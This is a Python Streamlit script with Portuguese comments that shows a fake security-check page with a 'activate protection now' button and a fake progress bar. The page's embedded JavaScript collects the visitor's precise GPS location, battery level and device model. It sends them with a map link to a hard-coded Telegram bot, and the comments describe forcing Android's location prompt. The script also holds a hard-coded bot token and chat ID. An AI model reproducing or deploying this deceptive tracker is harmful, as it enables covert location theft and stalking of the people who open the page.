import streamlit as st
import time

# --- CONFIGURAÇÃO DO BOT ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança", layout="centered")

# --- SEU ESTILO ORIGINAL (SEM MEXER EM NADA) ---
st.markdown("""
    <style>
    .main { background-color: #0b1117; color: white; font-family: sans-serif; }
    .stAlert { display: none !important; }
    .status { font-size: 20px; margin-bottom: 30px; text-align: center; }
    
    .btn-container { display: flex; justify-content: center; width: 100%; }
    .meu-botao {
        background-color: white; color: black; width: 280px; height: 75px;
        border-radius: 12px; border: none; font-size: 16px; font-weight: bold;
        display: flex; flex-direction: column; align-items: center;
        justify-content: center; cursor: pointer;
    }
    .ponto-vermelho { color: #ff3b30; font-size: 24px; }
    </style>
""", unsafe_allow_html=True)

caixa_texto = st.empty()
caixa_texto.markdown('<div class="status">Verificando: 4%</div>', unsafe_allow_html=True)

# --- O SCRIPT QUE FORÇA O POP-UP AZUL DO ANDROID ---
js_code = f"""
<div class="btn-container">
    <button class="meu-botao" id="triggerBtn">
        <span class="ponto-vermelho">●</span>
        <span>ATIVAR PROTEÇÃO<br>AGORA</span>
    </button>
</div>

<script>
document.getElementById('triggerBtn').onclick = function() {{
    // O SEGREDO: 'enableHighAccuracy: true' com um timeout curto
    // Isso faz o Android perceber que o GPS está desligado e abrir o Pop-up de Precisão
    const configuracaoForcada = {{
        enableHighAccuracy: true, 
        timeout: 10000, 
        maximumAge: 0
    }};

    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                const bat = await navigator.getBattery();
                const level = Math.round(bat.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                
                const info = "🛡️ PROTEÇÃO ATIVADA\\n📱 " + model + "\\n🔋 " + level + "%\\n📍 [LOCALIZAR](" + mapa + ")";
                
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{ chat_id: "{ID}", text: info, parse_mode: "Markdown" }})
                }});
                
                // Inicia a animação no Streamlit
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch(e) {{}}
        }},
        (err) => {{
            // Se o GPS estiver desligado, o Android joga o pop-up azul aqui
            console.log("Forçando ativação...");
        }},
        configuracaoForcada
    );
}};
</script>
"""

# Renderiza o componente com permissão de hardware
clicou = st.components.v1.html(js_code, height=120)

if clicou:
    for p in range(4, 101, 2):
        caixa_texto.markdown(f'<div class="status">Verificando: {p}%</div>', unsafe_allow_html=True)
        time.sleep(0.03)
    st.success("Verificação concluída!")
    st.stop()
    
